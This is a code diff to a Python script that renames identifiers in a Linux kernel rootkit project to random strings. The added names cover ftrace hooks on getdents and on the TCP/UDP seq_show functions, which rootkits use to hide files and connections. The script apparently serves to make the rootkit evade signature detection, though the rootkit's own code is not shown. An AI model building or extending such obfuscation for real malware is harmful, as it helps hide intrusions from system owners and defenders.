@@ -22,6 +22,26 @@ class FilesAndFunctions:
         self.var_map["rootkit_example_init"] = self.random_string()
         self.var_map["rootkit_example_exit"] = self.random_string()
         self.var_map["rootkit"] = self.random_string()
+        self.var_map["hook"] = self.random_string()
+        self.var_map["HOOK"] = self.random_string()
+        self.var_map["orig"] = self.random_string()
+        self.var_map["malw"] = self.random_string()
+        self.var_map["orig_tcp4_seq_show"] = self.random_string()
+        self.var_map["orig_tcp6_seq_show"] = self.random_string()
+        self.var_map["orig_udp4_seq_show"] = self.random_string()
+        self.var_map["orig_udp6_seq_show"] = self.random_string()
+        self.var_map["install_getdents"] = self.random_string()
+        self.var_map["hook_tcp4_seq_show"] = self.random_string()
+        self.var_map["hook_tcp6_seq_show"] = self.random_string()
+        self.var_map["hook_udp4_seq_show"] = self.random_string()
+        self.var_map["hook_udp6_seq_show"] = self.random_string()
+        self.var_map["hook_getdents"] = self.random_string()
+        self.var_map["install_tcp_seq_show"] = self.random_string()
+        self.var_map["install_udp_seq_show"] = self.random_string()
+        self.var_map["remove_getdents"] = self.random_string()
+        self.var_map["remove_tcp_seq_show"] = self.random_string()
+        self.var_map["remove_udp_seq_show"] = self.random_string()
+        self.var_map["ftrace_hook"] = self.random_string()
 
         self.file_map["project.c"] = self.random_string()
 
@@ -97,8 +117,8 @@ class FilesAndFunctions:
 
             if not line.lstrip().startswith("#include") and not line.lstrip().startswith("#pragma") and file != "Makefile":
                 for key, value in self.var_map.items():
-                    if re.match(r'(.*[^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9]).*', line):
-                        line = re.sub(r'([^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9])', r'\1'+value+r'\2', line)
+                    if re.match(r'(.*[^a-zA-Z0-9_]|^)'+key+r'([^a-zA-Z0-9_]).*', line):
+                        line = re.sub(r'([^a-zA-Z0-9_]|^)'+key+r'([^a-zA-Z0-9_])', r'\1'+value+r'\2', line)
 
             if line.lstrip().startswith("#") or file == "Makefile":
                 for key, value in self.file_map.items():
@@ -150,6 +170,8 @@ class Strings:
     def iterData(self, d):
         if isinstance(d, dict):
             for k,v in d.items():
+                if k == "module":
+                    continue
                 if isinstance(v, dict):
                     self.iterData(v)
                 elif isinstance(v, list):
